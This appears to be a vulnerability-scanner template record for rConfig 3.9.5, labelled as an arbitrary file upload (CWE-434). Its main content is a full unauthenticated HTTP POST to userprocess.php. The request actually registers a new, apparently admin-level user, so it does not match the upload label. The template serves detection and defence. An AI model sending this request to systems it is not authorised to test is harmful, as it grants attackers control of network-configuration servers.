# Nuclei Template: rConfig 3.9.5 - Arbitrary File Upload
**Template ID:** rconfig-file-upload
**Vulnerability Class:** Unrestricted Upload of File with Dangerous Type
**Severity:** High
**CWE:** CWE-434
**Source:** Nuclei Template (`rconfig-file-upload.yaml`)

## Vulnerability Information & PoC

## Description
rConfig 3.9.5 is susceptible to an arbitrary file upload via the userprocess.php endpoint. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Steps to reproduce / Exploit Payload
```http
POST /lib/crud/userprocess.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb
Cookie: PHPSESSID={{randstr}}

--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="username"

{{randstr}}
--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="passconf"

Testing1@
--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="password"

Testing1@
--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="email"

test@{{randstr}}.tld
--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="editid"


--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="add"

add
--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="ulevelid"

9
--01b28e152ee044338224bf647275f8eb--
```

## References
- https://www.rconfig.com/downloads/rconfig-3.9.5.zip
- https://www.exploit-db.com/exploits/48878
